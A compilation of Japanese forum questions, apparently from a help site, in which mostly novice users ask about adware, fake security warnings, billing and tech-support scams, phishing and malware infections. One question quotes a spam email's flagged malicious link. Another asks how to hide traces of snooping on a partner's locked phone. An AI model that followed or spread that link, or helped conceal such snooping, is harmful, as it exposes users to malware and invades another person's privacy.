1日に何度も、このメッセージが、届きます。 どのように対策したらいいのでしょうか？ 宜しくお願い致します‼️
無料ＡＶＡＳＴを利用しているのですがいつの間にかＡＶＡＳＴ　ＳＡＦＥＺＯＮＥ　ＢＲＯＷＥＲが常駐し、その為にＰＣの動作スピードが遅くなりました。ＡＶＡＳＴ　ＳＡＦＥＺＯＮＥ　ＢＲＯＷＥＲをアンインストールしようと思いましたがアンイストール出来るメッセージが見当たりません。どうしたらこのＳ／Ｗを削除出来るか教えてください。
windowsセキュリテイ緊急警告というのが、約２か月前ぐらいから表示されます。案内をみて自分で、できる範囲で操作しますと、defender定義の検索で固まってしまい、何度同じことを繰り返しても、全く前に進みません。問題があるかないかもわりません。また、ここで質問してよいのかもわかりません。困っています。 加齢者で初心者ですが、わかりやすくご教示おねがいします。
デスクトップ機（7pro64bit）、これが出てあらゆるところ不調になりました。 kingsoft　security　無料版を入れているので同場所同サイズでCM表示はよく出るのですが。 ブラウザすべてアクセス駄目状態で、キャプチャをUSBメモリで取ってサブ・ノート機でお尋ねします。 きっかけと思えるのはfirefoxの最新バージョンでYouTubeのダウンロードがどうしてもできなくなってたので、わざわざ古いバージョンインストしてdownload helperプラグインをインストしてｍｐ４をDLした以外にはDLはしていないので。。。 ◆夕方、起動したときBIOS画面が立ち上がってアレ？と思ってたら。。日付が2002年に。 ◆firefox　は　google　サイト初期設定ですが、「安全でない」とメッセージ ◆firefoxアンインストールがきかない。 ◆program file　にアンインストexeがない ◆昨日日付に復元後はCoud't load xpcom　というエラーメッセージで立ち上がらない ◆IEでもどこにもアクセスできない。 ◆WiFi通信はできているが、タスクバーから接続状態アイコンが消えている。 ◆Esseisial Security　も　アイコンが消えた。 実行はコマンドラインでできるので現在フルスキャン中。。
おめでとうございます。あなたは本日とてもラッキーです。とか　 ブラウザーの調査に協力すると、本日限定で表示の品物がタダ ・・確か、こんな内容でした。 で、何を思ったか、無意識に簡単に答えて送信してしまったのですが・・(笑;) その後、ブラウザー起動したりすると、有り触れた企業広告ですが、何か所か知らないページに思いついたように飛ぶ。たぶんフッシング詐欺サイトですよね。? 検索していたら https://ferret-plus.com/2163 ・・こちらとほぼ同じ内容でした。 ブラウザーはすぐ削除しましたが、IE11も突然動きが鈍くなった様な変な現状です。 右上に黄色いニコちゃんアイコン(写真あり)が張り付けられていますが ? これは通常ありませんよね。? 詐欺関係のものですかね。?　今、セキュリティ動かしても特に変化はありません。セキュリティはすべてオンなので、アドオンとかも無効にしてみましたが、変わらない。ブラウザーの治し方ありますか。? windows10 64bitですが、OSの復元が必要でしょうか。?
KINGSOFT Internet Security　２０１５ですが、 P-ShutDownTimer.exe 　で一時間後にシャットダウンを 設定しますが、システム保護の画面が現れ、中断され、 「シャットダウンが行われようとしています」 　のタイトル画面お最下部に、 「　終了動作を阻止」　 　　　　　　　　　　　　　　その他▼ で、▼をクリックで「動作を許可」を選ばないと電源が落ち ません。 この動作を許可する設定方法を教えてください。 （http://freesoft-100.com/security/kingsoft.html 　　を見ても分かりませんでした。）
WinZip Driver Updater　て何でしょうか？ これって何のソフトでしょうか・・・ 　なんか、ウイルスぽいのですが！？ よろしくお願いいたします。
最近、パソコン購入した超初心者ですがお尋ねしますが、笑わないで下さい。 質問は、個人的な或いは家族の重要な個人情報（資産・保険内容ｅｔｃ）を一覧表にして いるのですが（※ペーパーで記録すると内容を修正する場合に、また一から書き直さなければならな い手間が掛かる為）危険なことなのでしょうか？ 外部から私のパソコンに侵入して保存文書が漏洩してしまう可能性などあるのでしょうか？ まったく無知なのですが侵入なり漏洩というのはインターネットに接続していた場合だと 考えているのですが間違いですか？
何十年もたっている門なんですが、勝手に門が開いてしまうんです。 なんかいい道具とかあったら教えてください。
画面にメールだけのあなたのパソコンが壊れていますのでこちらにおでんわください。 もちろん怪しいのはわかっていますが、消してもすぐでてきて目ざわりしょうがないので消す方法がわかりません
windows7 pro 64bitですが、きっかけは明らかにGomplayerがupdateを通知していたのでそれを実行してから。 Microsoftのセキュリティを騙った怪しい誘導と直感して、バッテン閉じのうえ、きっかけとおぼしきGomplayerも完全アンインストしましたが、依然として出ます。 どなたか情報ご教示くださいm(_ _)m
私はネット広告をクリックしてインストールページに誘導されてソフトをダウンロードしたところ「〇〇〇個のシステム問題点が見つかりました」と大量のエラー表示が現れ「修理を開始」をクリックしたところクレッジトカードで有料のソフトを購入させられてしまい、「ご注文ありがとうございます」のメールが届きました。その後でコントロールパネルからPC Speedup Proをアンインストールしましたがそれでもやはり請求はくるのでしょうか。
標記の件で困っています。 このホルダが作られたのはAppleのicloud　driveをパソコンにインストールしてから作られたような 感じがします。 このicloud　driveをアンインストールしたがこのdriveは削除できないので困っています。 今、困っているのはUSBポートのホルダが削除出来ないのとicloud　driveのホルダーが削除出来ないことです。尚、USBポート（D：￥OB会）削除しようとすると添付画像のような警告が出ます。 osはwinndows１０です。
グローバルIPアドレス流動化について アイフオンを利用しております。 私の1日の予定とか、メールの 中身が不正侵入されているようです。 方法として、グローバルIPアドレス流動化が必要なようです。 ガラケイは絶えず流動化されているようです。 PCも電源抜き差しなどで流動化が 可能なようです。 二つ質問があります。 1.アップルに照会しましたが、できないと言われましたが、本当ですか？ 2.ガラ系は大丈夫な利用を教えて下さい。猪瀬さんなど、ガラ系とスマフォと使い分けているようですが、 上記利用からでしょうか？ 何卒よろしくお願い申し上げ
先ほど Web(Microsoft edge)を閲覧していたところ急に別のウィンドウが開き、お使いのコンピューターは、最近(5)分間に(13)個のウイルスに攻撃された可能性があります。次のソフトをダウンロードして下さい...等のことが記載されていました。 調べたところによると設定からcookieの削除を行うとの事でしたが、 【サイトからのメッセージ】で｢即時アクションが必要です。｣ と表示されていて、これを閉じることができず、その【サイトからのメッセージ】が邪魔で設定をクリックすることができません。 そのため、この広告のようなものが全く消えません。 無視すればいいとありましたが、設定が開けず、全く消えないのでちょっと怖いです。 このような場合はどうすればよいのでしょうか
先日MozillaFirefox　でメールの広告が目障りなので表示できなような設定はありませんか。とこの欄で質問したら「Add-one」をインストールしたら・・と教えていただいて入れたのですが、あるページでは「広告のブロックを解除してください」と表示されました。解除する方法を教えてください。
アンドロイドを使用していた時からですが今年機種変更したのてすが悪用されて変なサイトにアクセスされていたようなんです。 ここ最近監禁されているようで、怖く余りに偶然しすぎてどう解決したらいいのかが分かりません。
「ＩＰアドレス」とは何でしょうか？ＩＴ音痴なもので分かりません。これは重要な情報でしょうか？他人に知られたらどのような危険があるでしょうか？それとも何のリスクも無いのでしょうか？
Windows　Defenderで、ダウンロード型のトロイの木馬が検出されましたが、10回以上削除してもエラーになってしまいます　　エラー番号は0x80070005で　内容は「アクセスが拒否されました」となります 　削除実行後のメッセージは「操作は正しく行われました」で緑色になっています 対処方法が分かりません　ご教示頂きたくよろしくお願いします。
feel like〜ingの呼び方
先日パソコンのNTTフレッツウイルスクリアが上手く起動しなかったのでNTTの遠隔操作サービスで対処して貰いました。 その時NTT東日本の対応して頂いた方から最後にウイルスはフレッツウイルスクリアが正常に機能していれば問題ないがウイルス以外の脅威はフレッツウイルスクリアでは対処出来ず、インターネットの閲覧等により必要の無い悪意の有るファイル等がパソコンに入り込みパソコン操作を重たくしたりするなどの状況になる事が有りますと言われました。 そこでNTT東日本の紹介と言えば今無料でパソコンの状態をチェックして貰えると言われクラブQ&Aと言う会社を紹介されました。 パソコンの状態をチックする事は無料だがもし問題が有れば対処は有料ですとのお話でした。 そこで先の遠隔操作で対処をしたパソコンとは別の購入後10ヶ月程の新しいパソコンの状態をチェックして貰おうとクラブQ&Aと言う会社に電話をしてチェックして貰ったところ、パソコンに４つ程不必要なファイルが入って来てます、そのままにして置くとどんどん不要なファイルが侵入してきてパソコンが重たくなったり起動しなくなる場合が有りますと言われ駆除作業を今有料になりますがやりますか？と言われました。 私は何だか納得出来なかったので今すぐに問題が起こる様で無ければ有料駆除はしなくて良いとと伝えて断りました。 すると次は不要なファイルがパソコンに入り込む原因はネットのページに有る広告サイトをクリックしサイトに入る事で起こると言われ、更に広告駆除サポート（有料で￥9720）の作業を勧めらられました。 やはり納得出来なかったのでお断りしました。 そこで質問です ①クラブQ&Aと言う会社は信頼できる会社でしょうか？ ②現在パソコンに４つの不必要なファイルが入っているとの事ですが本当に駆除しないとパソコンに悪い影響が起こるのでしょうか？ ③クラブQ&Aの人に遠隔操作して貰いパソコンに入り込みチェックする為に一時的にソフトをインストールされてチェックをして貰いましたが今後問題は無いでしょうか？ ④広告駆除サポート（有料で￥9720）を勧められましたが必要でしょうか？ NTT東日本からの話で信用してチェック依頼をしましたが、何だかチェックは無料だがチェック後に特に問題の無い状態に対して有料作業へ持っていかれている様で気になりました。 パソコンをこのまま使用していて特に問題は無いでしょうか？それともクラブQ&Aの方が言われるように有料作業をお願いした方が良いでしょうか？ パソコンは１０ヶ月程前に買ったNEC LAVIEの４ギガCOREi3のパソコンで通常の使用はネットの回覧とエクセル作業画像の編集取り込み程度の使用です。 どうか詳しい方のアドバイスを宜しくお願い致します。
昼休みにパソコンの会社で賃貸物件を探しており、自分の携帯アドレスへ物件データを転送したせいなのか何なのか分からないのですがその5時間後にパソコンのカーソルがひたすら下に動き続け、止めることが出来ないので画面を閉じましたがまた勝手に開かれては下に動き続けるという謎の暴走が始り、とても焦りました。 もしかして昼のインターネットのせいかと思ったのですが会社のパソコンはネットに接続しているのと接続していないもの二つを画面切り替え？して使えるようになっておりネットに繋げていない方でも同じ症状が見られました。 怪しいサイトではなくCMなどでもよく取り上げられている賃貸物件を検索できる会社のサイトですが、それのせいでウイルス感染したのかと思い不安でなりません。。 会社のパソコンを使用する前に会社の人には許可貰いましたが、自分の携帯にデータ転送したことがやはり危険だったのかと思いすごく反省しております。 一時的なキーの故障だと信じたいのですが、パソコンに詳しい方ご教示頂けませんでしょうか。 もう二度と会社のパソコンで自分の調べ物はしないようにしようと思います。
マカフィー®トータルプロテクション　「危険　ご使用のパソコンは危険な除隊です」というポップアップが出てきます。ロゴを見ても偽物です。本物ののマカフィーの削除ツールがあるのは見つけましたが、このような偽物のポップアップが出てくる原因と対策を教えてください。 　すでにウイルスバスタがインストールされているので、マカフィーは必要ありません
最近アダルトサイトに間違えて登録してしまって困っています。 誰か助けてください。お願いします。
先日私のpcがウイルスに感染した恐れがあった為、pcを出荷状態に戻しました。 おそらくそれでウイルスの脅威からは逃れられたと思うんですが、1か月くらい無料お試しのノートンが復活しました。 これを利用すると定期的にpcを出荷状態に戻せば半永久的にノートンが無料で使えてしまうわけですが、「実は利用規約違反」や「実はバージョン古くてウイルス感染」とかが怖いです。 使わないほうがいいでしょうか。
mshta.exe Microsoft(R) HTML アプリケーション ホスト に関連した広告 不正ポップアップの削除 トレンドマイクロ専門技術者対応！アダルトサイトの不正請求画面を削除 おまかせインストール · ウイルスバスター購入 · 偽ソフトで金銭請求
My Image Converterに取り憑かれてしまいました。アンインストールして削除したはずなのに、思わぬ時に、現れます。google検索の真似してるみたいです。どうやったら、完全削除できますか。当方Windowｓ10を使用しております。
パソコンがランサムウエアに羅患していますが、hddを新らしいのに変えれば問題ないですか？ osから入れ直し
Windows10です。 いつの間にか、Driverupdateというソフトのshortcutがdesktopが表示され、 放って置いていたところ、添付のお知らせが表示されました。 このAMDとはCPUが通常インテルに対するメーカーの名前で、本体にシールが貼られています。 しかし、Slimware Utilities Holdings　というのは知りません。 「はい」を押してもよいでしょうか。
今日たまたまamamixを起動させていたところ、突然画面が真っ白になり、ウイルス検知されたと出てきました。 私は不思議に思ったので、再インストールしてみたところまた検知されてしまいました。 今までこのようなことはなかったのですが、なぜでしょうか。 因みにアンチ・ウイルスソフトはAVGです。
大変お恥ずかしい事なのですが、最近マルウェアに感染したらしく、困っております。 どこで感染したのかはわからないのですが、症状として ・Googlechromeを使用中、勝手に海外サイトが開く。サイトは一貫性のないランダム。 ・最初に開くchromeのホーム画面が見知らぬ検索画面（注　一応こちらはAdwcleanerと言うソフトを使用したところ消えたので解決したと思いますが、最初にあった症状です） ・原因とみられるMPC～～と言うマルウェア？こちらのフォルダは、消えたのですがAdwcleanerを使用しても、毎回検出される。セーフモードでも試しました。 以上です。OSはWin10、ウィルスバスターを入れています。 現在勝手にタブが開いて海外サイトが表示される現象に頭を悩ませている状態です。最悪初期化かもしれませんが、もし解決法があれば教えていただけると幸いです。よろしくお願いいたします。
http://guchirin.com/
メールの中身とかラインの中身とかわかるモンですか？クッキー解析とかで。
Chromeをインストールしてから画像のような広告が毎回出たりサイトに無理やり飛ばされたりします。 Sleipnirなどでも同じ事が起こるようになってしまい、どうすればよいのかわからない状況です。 改善策などお教えいただければ幸いです。
Windows8.1を使っています。 先日Windows Defenderを更新しました。 するとその後、5分おきくらいに「マルチウェアを検疫しました」と出るようになりました。 その都度確認するのですが、履歴タブで検疫されている項目、検出された全ての項目、両方とも何も表示がありません。 後日、検疫の頻度が上がったので再度確認してみると、トロイの木馬でした。 Windows Defenderで検出するごとに削除していましたが、何度も出てくるので、自分なりに調べてウィルスバスターの無料お試し版をインストールし、スキャンしたところ、脅威は検出されませんでしたとなります。 ただスキャン中、「トロイの木馬プログラムをスキャン中…」という表示も出てるんです。 トロイの木馬が駆除できているのかどうか、調べる方法はありますか？ 検索するとmacの場合はよく見かけるのですが、windosでのやり方を教えて下さい。
謝って変なサイトの広告をタップしてしまい、写真のような請求を求められました。 残り24時間以内に退会申込みをしないと、登録とみなされ、15万という大金の請求とアダルト系の書類が送られてくると書かれています。 そして、自分の端末の情報が記載され、IDが勝手に作成されていました。 このような場合、無視で大丈夫なのでしょうか？ 退会申込みなどしてしまうと、逆にデータを盗まれてしまうと判断したので、無視しようかと思うのですが... 初めての体験で、少し不安です。早めのご回答をよろしくお願いします。
謝って変なサイトの広告をタップしてしまい、写真のような請求を求められました。 残り24時間以内に退会申込みをしないと、登録とみなされ、15万という大金の請求とアダルト系の書類が送られてくると書かれています。 そして、自分の端末の情報が記載され、IDが勝手に作成されていました。 このような場合、無視で大丈夫なのでしょうか？ 退会申込みなどしてしまうと、逆にデータを盗まれてしまうと判断したので、無視しようかと思うのですが... 初めての体験で、少し不安です。早めのご回答をよろしくお願いします。
HNを変えて　付きまとう人がいるみたいなんですけれど どうしたら　拒否出来ますか？ 完全にネットストーキングされていて 気持悪いです。 助けて下さい。
マルウェアで困っています。 Malwarebytes Anti-Malware(お試しプレミアム)とHitman ProとEmsisoft Anti-Malwareでスキャンして 駆除したはずなのですが、未だにウィルスに感染させただとか、ｗｉｎ７の修理だとかのｗｅｂが 勝手に開き、ブラウザを変えても出てきます。Sleipnir、ＩＥ、ＯＰＥＲＡ、ＦＩＲＥＦＯＸのいずれも。 また、セーフモードでのスキャンも実施済みなので、現状打つ手がありません。 セキュリティソフトはうぃするバスタークラウド２０１６を入れていますが、ポップアップなどは 反応してくれず、そのＵＲＬを閲覧禁止に指定して表示しないような措置をとっていますが、 それら全てを登録することはできませんし、たくさんの窓が開いてすべてウィルス表示になる場合もあります。 私感ですが、現在フリーで使っているMalwarebytes Anti-Malwareですが、プレミアムの リアルタイムスキャンが有効だったときは、ウソのように改善されたような感じを受けました。 海外ソフトということでプレミアムにいくら掛かるのか、また、詐欺に遭わないか心配で プレミアム登録をしていません。いったいいくら払えばプレミアムにできるのでしょうか。 また、どのようにすればいいのでしょうか。 全くネットサーフィンができないこともあり、Ｃドライブ(ＳＳＤ)の取り替え(容量アップ)と、 ＯＳの再インストを考えるまでになっています。 もう、自分でもどうにかなってしまいそうなくらいイライラします。 どうするのが一番良いのでしょうか？ ＯＳ再インストするにしても、再度感染するのならばあらかじめセキュリティーソフトを ちゃんとしたものを入れたいですし。Ｃドライブ(ＳＳＤ１ＴＢ使用予定)の容量も減らしておきたいですし、不具合が起きた場合は、ＯＳ部分のみのリカバリー対応をとも考えていますが、 ゲームソフトやビジネスソフトもインストールしたいので、そういうことが可能かどうか運用も心配です。 長文になりましたが、どうしたら良いでしょうか?
私のyahooメールのアドレスで、多くのアドレスにスパムメールが送信されていたことが分かりました。 送信先には、アドレス帳に登録していたアドレスや、送信履歴のあるアドレスの他、まったく見覚えのないアドレスも含まれていました。 迷惑メールの内容は、以下のような感じです。 セキュリティソフトで引っかかるようなリンクが貼ってありました。 -------------- Subject: Fw: new important message Hello! New message, please read http://mainstreetradical.com/lid.php -------------- ＊＊ 送信失敗のメール「Mail delivery failed: returning message to sender」が大量に迷惑メールに送られてから、知人より不審メールの注意をメーリングリストで送られて２時間後に気づき、yahooメールのアドレスの変更とワンタイムパスワードの設定を行いました。 それがきっかけかどうか分かりませんが、以降、迷惑メールの送信は行われていないようです。もっとも、送信失敗のメールが届き始めてから数十分後に、アルファベット順の「w」にまでメールが送信されていたようですが…。 先のyahooメールのパスワード変更に合わせて、私のパソコンのセキュリティチェックも行いましたが、ウィルスは検出されていません。 ＊＊ この場合、どのようなことが起きていたと考えたらよいのでしょうか。 また、どのような対策を取ったほうがいいでしょうか。 メールアドレスを変更したほうがよいのか、別のツールでパソコンのセキュリティチェックを行ったほうが良いのか… どなたか、教えていただけませんか？
マカフィの怪しいプログラム検出などで PUP-RGOTという意味がわかりません。
よくあるスパムメールを開いてしまい、そのリンクを踏んだところ、Facebookのログインページにそっくりな画面が出てきました。アドレスはwww.xe9d9e(変な文字列）.facebook.com みたいな感じだったと思います。この手の怪しいページには引っかからない自信があったのですが、何を思ったのかうっかりメールアドレスとパスワードを入力してログインしてしみました　＼(^o^)／ ログインしたところ、ものすごい怪しいポップアップがでて、音声つきで「あなたのパソコンはウィルスに感染しました　治したければこちらに電話してください　　03-xxxx-xxxx」という表示が出てきました。びっくりしました！ その後ポップアップが消えずタスクマネージャーからブラウザを停止し、PCの電源を切りました。 アンチウィルスのソフトはAviraを使っています。 その後、PCを再起動後、とりあえず （１）別のPCからFacebookにログインしてパスワードを変更する （２）AviraでPCをフルスキャン。その後、Malwarebite　もインストールしてPCをフルスキャン （３）何も検出されないことを確認してOSをクリーンインストール これ以外になにかやっておいたほうがいいことはあるでしょうか？（３）まではしなくてもよかったのでしょうか？多分フィッシングに近い詐欺広告が出ただけだと思いますが、この手のものは久々の遭遇で焦ってしまいました。 アドバイスよろしくお願いします！
ホームページに「ＰＣのエラーを修復しました・クリックしてください」等が出ているのですが、これってｇｏｏさんが親切にＰＣのエラーを修復してくれるのですか？以前にマイクロソフトの親切なソフト修復のようなものが出ていたのでクリックして、大変な目にあってＰＣがおかしくなったことがありました。ＯＣＮのホームページにも同じような親切な文言が出ているのですが、これって大丈夫？それとも詐欺？教えてください。
RootkitRevealer.をダウンロードした際にC:\Users\ユーザー名\AppData\Local\TempにAKH.exeやCKPMQHP.exeといったどんな働きをするのかわからない実行ファイル群が多数生成されました。そのうちの一つのDC.exeからはbackdoor.agentだというスキャン結果が表示されました。どの様な種類でどのような働きをするファイル群なのか自分では判らなく判断に困るので教えてください。
PCについての質問です。いまさっき、space sound proだかっていう広告をポップアップしてくるような迷惑ソフト（ウイルス？）に引っかかったのですが、完全にそのソフトを削除する方法はあるのでしょうか？また、このまま放っておいたらどうなるのでしょうか？あまりPCは使わないので、そんなに危険がないようでしたら放置ということも考えていますが… できるだけ分かりやすく回答をお願い致しますm(_ _)m
初歩的な質問です。 nexus7（2013) 開封後の最初のページ「ようこそ」から「日本語」選択　そして「Wifiネットワーク」の選択から「無線LANの選択」へ　「次へ」タップしても「ページが見つかりませんでした」となって　これ以上進みません。上記「wifi」選択では「接続済み」と表示されるだけに　これ以上どうすればいいのか　困り果てています。2012版ではうまく行ったのに　泣きたくなります。７７歳老人を助けると思って　どうか知恵を授けてください。なお「perfect manual」書の「初期設定」項目の記述は参考になりませんでした。
パソコンを遣っていると、画像のものが表示されます。 『 株式会社 セキュアブレイン 』 とあります。 この会社名を調べてみたところ、ホームページも在り、 Wikipedia にも記載が在りました。 セキュリティ企業のようですが 「 有効にする 」 で大丈夫でしょうか?
freemake video downloader、video converter の２種をインストールしていたのですが、いい噂を効かないのでアンインストールしました。 レジストリからもfreemakeをフォルダごと削除して何も残ってないはずなのですが、 いまだに右下に「update is ready」のポップアップが表示されます。 インストールする際は注意して、他のソフトがインストールされないようにチェックを外しながらインストールしたので、そこは間違ってないと思っているのですが。 お詳しい方、削除に成功したからのアドバイスをいただければ幸いです。 よろしくお願いいたします。
今更なのですがインストールの仕方が解りません。 ダウンロードしたら画面左下になんか出てるのですが開いても大丈夫なんでしょうか？
以下はサイバーセキュリティについての英文です。意味が分かりません。よろしく However, if the malware is delivered via flash drives left at various cyber conferences in the hope the drives will eventually be used at a military base (but it will also more than likely disable civilian systems), its use would violate this Rule.5.
windous7を使っております。デスクトップをみたらinstall と書いた アイコンがありまして、ネットで調べてみたら　どうも　install.exe と言うスパイウエアらしいのです。 どうしたら良いのかわかりません。 普通に削除しても良いのでしょうか？ 教えてください。　　　宜しくお願い致します。
新しくWindows 10を買いました。 　今まで問題なく使ってたのですが、インターネットの接続の調子が悪くなった為、 　調べてみたらFirewallが有効になっていませんでした。 　このFirewallを有効に出来なくて困っています。　設定の仕方が悪いのか、　スパイウェア（Norton)　(McAfee)の設定が悪いのか、　私には良く分かりません。 Nortonは前回から使ってるのを引き続き使っています。McAfeeは最初の数か月フリーで入っています。（つまり２つ入っています。　これが問題なのでしょうか？） 　どなたか　Firewallの有効化について詳しい方、　もしくは詳しく書かれているURLがあれば貼り付けていただけないでしょうか。 パソコン初心者の為、基本的なことを見落としている可能性もあり、どうしたらいいかわからず困っています。 宜しくお願いいたします。ｍ（＿＿）ｍ
Google Chromeを使っていると勝手にタブが開いてreimage repairと言う会社の広告が頻繁に出るようになりました。Malwarebytesと言うソフトで駆除を試しました。時々警告としてbdt.femurssculler.comが出てきてこれを駆除したいのですがどうすればいいのか分かりません。ご存知の方がいれば教えて頂きたく宜しくお願い致します。
こんにちは！ パソコンを使っていると、時々勝手にEPSONのドライバのアップデートが立ち上がってきます。 確かに以前はEPSONのプリンタを使っていた時もありましたけど、今は他社さんの プリンタを使っているため、ドライバはすべてｱﾝｲﾝｽﾄしたのですが、それでも 勝手に立ち上がってきます。『アプリケーションの追加と削除』を見ると、確かに 消したはずのドライバが『ドライバアンインストーラー』という形で入っています。 不定期に勝手に立ち上がってくるし、消しても消しても勝手に入ってくるし、 はっきり言って迷惑しています。 どうすれば二度と出てこないようになりますか？ 教えてください。
「マルウェア感染を削除には ○○様, と個人的なライセンスキー」という表題でメールが届きました。 ダウンロードを開始という釦がありましたが、個人情報を漏らしたり、ウィルスに感染させる結果となってしまうのでしょうか？無視すべきでしょうか？ 以前ファイアーフォックスをダウンロードしたことがあり、別のソフトもダウンロードしましたが、 現在は削除してありますし、そのソフトの料金支払いの確認メールが来ましたが、支払いはしないと回答しました。 また、 メール本文下部に、下記のことが書かれてあります。 Microsoft Partner Gold Application Development ご不明な点等ございましたら、：0120-933-350にお電話下さい。 RegClean Pro を購入したため、このメッセージを受信しています。 当社はお客さまのプライバシーを重視しており、以下のポリシーに従ってのみお客さまの個人情報を使用します：プライバシーポリシー メッセージを受信したくありませんか？ ここをクリックして登録解除 | ブラウザで表示 この電子メールの送信者： Systweak Software, IT/ITeS Mahindra World City, Jaipur, Rajasthan, India www.systweak.com | お問い合わせ
ＰＣでネットをしていると、ブラウザを開くたび広告が出ます。 〈Windows８修理！みたいなのとか・・・〉 その広告が出るようになるたび、復元ポイント？で広告が 出るようになる前の設定に戻し、なおしているのですが・・・ 最近頻繁にまた広告が出るようになりました。 直しては消えの繰り返しです。 アダルトサイトや怪しいサイトは一切開いてません。 なにかいい方法はないですか？？
数日前のことですがウィルスorスパイウェア、トロイの木馬等に 感染した可能性が出てきました。 以下、箇条書きですがお願いします。 数日前に一瞬、警告の表示が出て消えました。トロイの木馬だったかもしれません。 見つかった？感染した？のか。 警告が出た直後はＰＣ上のファイルやアイコンが消えて、壁紙がねずみ色の無地になって 強制終了しないと動かせない状態でした。 現在は数日前よりも動作が不自然ですし重いです。 症状としては・・・ウィンドウがなかなか開かなかったり 開いているフォルダーが勝手に閉じたり、スピーカーの音が勝手に出たり 音楽ファイルとメディアプレーヤーが立ち上がらない、起動しない。 閲覧しているサイトをお気に入りに追加をクリックしても お気に入りの一覧に入らなかったり 画面下のアイコン、デスクトップ上のアイコンやファイルが 一旦消えて数秒後に元に戻ることもあります。 これらの不可解な現象が、たびたび起こります。 急にシャットダウンをするとか、フリーズを起こすとか アダルト系のウィンドウや広告が沢山表示されるとか そういった極端なことは起こっていません。 気になったのでコントロールパネルの中の プログラムと機能（プログラムのアンインストール）を開き 一覧を確認しましたが、ウィルスやマルウェアらしき物は見当たらなかった。 各アプリ、ソフトウェアの発行元に不審な会社名もありませんでした。 ノートンインターネットセキュリティ、ノートンパワーイレイサーをネットから 無料で落として検査しましたが何か不審な物に感染はしていませんでした。 しかし先に述べたとおりの不可解なおかしな状況でｐｃの操作も 正常だった頃と比べて変です。 現在使っている。ノートPCに入っているウィルス対応ソフトは 「ノートンインターネットセキュリティの３０日無償版」 「ノートンパワーイレイサー無料版」 「マカフィーセキュリティスキャンプラス無料」 「avast_free_antivirusの無料」 すべて無償のバージョンだけです。 ↑複数の無償版のため不安はあります。 これら複数入っているソフトの不具合による？現象は反応があるために すべてアンインストールして綺麗に消去したうで 有料版のネットセキュリティアプリと ウィルス除去機能のアプリ・ソフトを量販店や通販で購入するべきでしょうか？ トロイの木馬等のスパイウェア・ウィルスの影響なのか、 またはセキュリティのソフトによる影響なのか混乱しております。 見ててとても疲れます。 ウィルスの感染によって私が気になる危惧することとしては 最近メディアで報じられているように、インターネット銀行（ネット口座）、 クレジットカードの番号、各種ＩＤ、パスワード 氏名、住所、メールアドレスなどの個人情報が抜き取られる、漏洩して 悪用される可能性があるのではないのか？ということです。 ちなみに現在使っているノートＰＣはあと１年～約１年半:１８か月ほど使い倒せればよいのです。 その間まで安全に使いたいと願っております。 Windowsのバージョンは8.1です。 ただ、有料契約の正規のウィルスソフトに毎月数千円を支払う余裕はございません。 PCを購入した時点でウィルス検知、ウィルスやスパイウェア除去の アプリやソフトは入っていない機種を購入して現在に至っています。 無料ないし安価で購入できるウィルス、スパイウェアを防止・検知・駆除できる アプリ、ソフトウェアーをご存知でしたらご紹介ください。 以上、セキュリティーに関しての対策、経験からの回答お願い致します。
今まで出なかったサイト、ページ右下（半分）に画像のような広告が出るようになりました。 この画像とは別に画面真ん中右上程に小さい窓が出る時もあります。（通販系の広告が多いです） 少し前から、どのサイトか忘れましたがこういう広告が出て見づらいなと思いつつ滅多に見ないサイトなので放置しておりました。ですが本日よりよく見るサイト（この質問サイトなど）にも広告が出るようになりました。 ウィルス検査をしても特に異常はなく、何をアンインストールすればいいか分からないので、表示をしないようにする又は削除はどのようにするのか教えて頂きたいです。 この手の広告系の質問はたくさんあるのですが、少し広告が違う感じがして質問させて頂きました。 無知で申し訳ないです・・・。 Chrome利用 ウィルスソフト：smartsecurity8 ＯＳ：windows７ 拡張機能：Adblock Plus 1.10.1　 　　　　　Chrome Apps & Extensions Developer Tool 0.1.18 使用中です。 不明な点が多々あると思いますが、宜しくお願い致します。
お恥ずかしい話ですが、彼氏の携帯を初めてチェックしてしまいました（浮気の確認のため、ＬＩＮＥを見ようとしました）。 その時ロックがかかっていて、数回間違えた後写真を撮られました。調べたら「ＣＭセキュリティ」というアプリでロックをかけていたようです。 ＬＩＮＥを開いたという痕跡と、撮られた写真を消すにはどうすればいいでしょうか？（もうチェックは二度としません・・・・）
ウィンドウズ7　不具合で　初期設定したいのですが？　方法を指南お願いいたします。
自宅で有線でネットを利用しています。 有料セキュリティソフトやアップデート以外の セキュリティを強化する方法を教えて下さい。
いろいろあって聞きたいんですが LogMeIn Hamachiを起動してたらおもくたりますよね？（笑）
アダルトページを閲覧したわけでもないのに、SmartShopSaveという検索サイトが出て困ってます。ウイルスバスターを入れておくと「このwebサイトは、安全ではない可能性があります」と出て、GoogleやYahoo!などの一般サイトにも飛べず、一旦、ウイルスバスターをアンインストールすると、SmartShopSaveが出ます。Internetexplorer、Googlechrome、Microsoftedge全てこの現象がでます。 そして、yahooなどからgooなどを検索すると、「このページは表示できません」と出たりします。今やっと教えてgooは出ました。また、ディスクの容量が少なくなってますと、カブ箇所に出てクリックするようにでます。 これらを出ないようにする対策はないでしょうか？同じ質問を過去にされた方もいるでようが、どうか困ってますのでよろしくお願いします。
Spybot-S&D Start Centerの日本語化が出来ないのです。 日本語化のパッチを入れてもダメでした。 どうしたらいいでしょうか？
MITBに感染してしまいました。 無料で永久に使えるサイトはありませんか？
まとめサイトの記事を閲覧していて、脇のほうに有った記事見出しをクリックしたら 青い画面が現れました。 「重大なセキュリテーの今日が検出されました」という表示が出て、閉じることが出来ません。 白いPop-upには「Infeciton ID (数字）　　 　　　　　　　　　Warning Softbank + BB +Corpcustomer 」と表示され、 これも消すことが出来ません。 駆除方法を教えてください。
osがwindows7のパソコンですが、起動時の画面に 　C:\windows\system\spool\DRIVERS\W32X\86\3\DCLDtime.dⅡ　 　を開始中にエラーが発生しました。　指定されたモジュールが見つかりません と出ます。 windows10のインストールが途中で中断し、 office soloのサインインでは、 次のエラー：0xC004B011が発生したため、アクティブ化できませんでした。アクティブブ化する 　サーバーはコンピューターのクロックタイムが正しくないと判断しました。アクティブ化する前にク 　ロックを修正してください と表示されてサインイン手続きが止まってしまいます。 何かのドライバーを誤って消去してしまったのでしょうか。 どなたか、解決方法をご存知でしたらお教えいただけないでしょうか。 よろしくお願い申し上げます。
